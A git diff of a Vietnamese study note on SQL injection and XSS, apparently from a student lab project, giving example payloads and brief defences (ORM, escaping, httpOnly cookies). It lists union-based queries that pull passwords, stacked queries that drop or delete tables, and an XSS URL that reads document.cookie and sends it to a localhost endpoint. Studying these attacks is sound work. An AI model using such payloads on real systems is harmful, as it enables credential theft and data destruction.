@@ -1,22 +1,41 @@
 1. Muc tieu
-La muon hieu ve SQL Injection va xss va cach phong chong ra sao, 
+    La muon hieu ve SQL Injection va xss va cach phong chong ra sao, 
 tai sao can phai phong chong
 
 2. Cơ sở lý thuyết
 2.1 SQL Injection
 2.1.1 In-band SQL Injection (Doc du lieu)
-+ errorBasedInjection = bahgs' or 1=1 jags
-+ unionBasednjection (Union based)= ahgsb%' UNION SELECT id, email, password, 0 FROM users -- -%'
+    + errorBasedInjection = bahgs' or 1=1 jags
+    + unionBasednjection (Union based)= ahgsb%' UNION SELECT id, email, password, 0 FROM users -- -%'
 2.1.2 Blind / Inferential SQLi (Suy doan du lieu)
-+ loginInjection (Boolean based) = bla' or 1=1 -- 
+    + loginInjection (Boolean based) = bla' or 1=1 -- 
+    + TimebasedInjection = SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END; -- 
 2.1.3 Piggy-backed Queries SQL Injection (them, xoa, chinh sua du lieu)
-    updateInjection (Stacked Query Injection) = asggs%'; update users set email = 'thanhduyuth@gmail.com' where email = 'thanhduyuth123@gmail.com' -- 
-    insertInjection (Stacked Query Injection) = ashg%'; INSERT INTO products (productName, price, quantity) VALUES ('Meat', 250, 150) -- 
-    deleteInjection = ausygv%'; delete from products where productName = 'Potato' -- 
-    dropInjection = ajsgsb%; drop table security -- 
-2.2 XSS 
+    + updateInjection (Stacked Query Injection) = asggs%'; update users set email = 'thanhduyuth@gmail.com' where email = 'thanhduyuth123@gmail.com' -- 
+    + insertInjection (Stacked Query Injection) = ashg%'; INSERT INTO products (productName, price, quantity) VALUES ('Meat', 250, 150) -- 
+    + deleteInjection = ausygv%'; delete from products where productName = 'Potato' -- 
+    + dropInjection = ajsgsb%; drop table security -- 
+2.1.4 Cách phòng chống SQL Injection
+    + Sử dụng các thư viện ORM (Object-Relational Mapping) giúp cho lập trình viên có thể sử dụng code để truy vấn cơ sở dữ liệu thay vì
+dùng các câu truy vấn thuần.
 
-docker compose down
-rm -rf node_modules
-npm install
-docker compose up --build
+
+2.2 XSS 
+2.2.1 Reflected XSS
+    + Là kiểu tấn công lừa đảo, hacker sẽ lừa người dùng đăng nhập vào hệ thống 
+sau đó gửi cho người dùng các URL đã chèn mã độc, nhằm đánh cắp các thông tin của
+người dùng như token....
+    + /search?q=<script>alert("Im a hacker");</script>
+    + /product?search=<script>alert(document.cookie);</script>
+    + /product?search=<script>const token = document.cookie; window.location.replace(`http://localhost:4000/fun/page/${token}`);</script>
+2.2.2 Stored XSS
+    + Là kiểu tấn công khi hacker tận dụng những thẻ input, form, textarea chưa được validate kỹ. Hacker có thể  chèn vào một đoạn mã độc
+vào các thẻ input, form, textarea để lưu vào csdl, khi người dùng sài đến dữ liệu đó thì sẽ dính mã độc.
+    + Ví dụ: trong phần comment hacker bình luận một mã độc là <script>alert("Im a hacker");</script>, thì khi người dùng ấn vào phần bình
+luận, trình truyệt sẽ thông báo "Im a hacker"
+2.2.3 Dom Based XSS
+    + Là kiểu tấn công khai thác vào lỗ hổng DOM trong HTML, hacker có thể  thay đổi cấu trúc HTML của website nhằm
+đánh cắp thông tin của người dùng.
+2.2.4 Cách phòng chống XSS
+    + Không cho nhập các ký tự như "<", ">", dùng escaped trong HTML hoặc các template, để httpOnly: true nếu sử dụng
+cookie để lưu token
